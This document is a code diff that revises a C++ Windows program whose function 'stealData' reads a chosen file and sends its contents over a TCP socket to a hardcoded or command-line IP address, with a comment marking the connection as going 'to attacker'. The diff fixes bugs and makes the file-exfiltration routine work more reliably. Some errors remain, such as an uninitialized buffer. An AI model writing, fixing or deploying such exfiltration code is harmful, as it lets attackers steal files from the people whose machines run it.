@@ -10,44 +10,63 @@
 #include <string>
 
 using namespace std;
-
-int stealData(char *fileName, SOCKET Socket)
+int stealData(char *filePath, SOCKET Socket)
 {
-    FILE *fp = fopen(fn, "r");
+    int maxBuff = 256;
+    char *nl = "\n";
+    FILE *fp = fopen(filePath, "r");
     if (fp)
     {
         char c;
         do
         {
-            int count = 0;
+            int count = 0, buffSize = 0;
             char *buff;
-            while (buff < maxBuff && c != EOF)
+            while (buffSize < maxBuff && c != EOF)
             {
                 buff[count++] = c = fgetc(fp);
+                buffSize += sizeof(buff[count]);
             }
-            send(Socket, buff, sizeof(buff), 0);
+            if (send(Socket, buff, buffSize, 0) == 0)
+                perror("Faild to send buffer");
+
         } while (c != EOF);
-        closedir(dir);
+        send(Socket, nl, sizeof(char), 0);
+        fclose(fp);
         return 1;
     }
     else
     {
-        perror("File not found")
+        perror("File not found");
+        return 0;
     }
 }
 
 int main(int argc, char *args[])
 {
+    // server variables
+    char *ip;
+    int port;
+    char *filePath;
 
-    // Vars
-    char *ip = args[1];
-    int port = atoi(args[2]);
-    char *filePath = args[3];
-
-    if (fopen(fn, "r") == 0)
+    if (argc > 1)
     {
-        perror("File not found")
-            ExitProcess(EXIT_FAILURE);
+        // take from args
+        ip = args[1];
+        port = atoi(args[2]);
+        filePath = args[3];
+    }
+    else
+    {
+        // hard code server variables
+        ip = "10.10.18.2";
+        port = 1234;
+        filePath = "test.txt";
+    }
+    if (fopen(filePath, "r") == 0)
+    {
+        perror("File not found");
+        ExitProcess(EXIT_FAILURE);
     }
     // winsock init
     WSADATA wsaData;
@@ -55,31 +74,33 @@ int main(int argc, char *args[])
     WORD DLLversion = MAKEWORD(2, 1);
     if (WSAStartup(DLLversion, &wsaData) != 0)
     {
-        printf("Erorr, can't continue.");
+        perror("Erorr, can't initiate winsock");
         ExitProcess(EXIT_FAILURE);
     }
 
-    // Create Socket
+    // create Socket
     SOCKET Socket = socket(AF_INET, SOCK_STREAM, 0);
     if (Socket < 0)
     {
-        printf("Erorr, can't continue.");
+        perror("Erorr, can't create socket");
         ExitProcess(EXIT_FAILURE);
     }
-    // Bind the socket
+    // bind the socket
     addr.sin_addr.s_addr = inet_addr(ip);
     addr.sin_family = AF_INET;
     addr.sin_port = htons(port);
 
     // connect to attacker
-
     connect(Socket, (SOCKADDR *)&addr, sizeof(addr));
 
-    // take action
+    // start sending
     send(Socket, filePath, sizeof(filePath), 0);
     send(Socket, "\n", 1, 0);
 
     stealData(filePath, Socket);
 
+    // close the connection
+    closesocket(Socket);
+    WSACleanup();
     ExitProcess(EXIT_SUCCESS);
 }
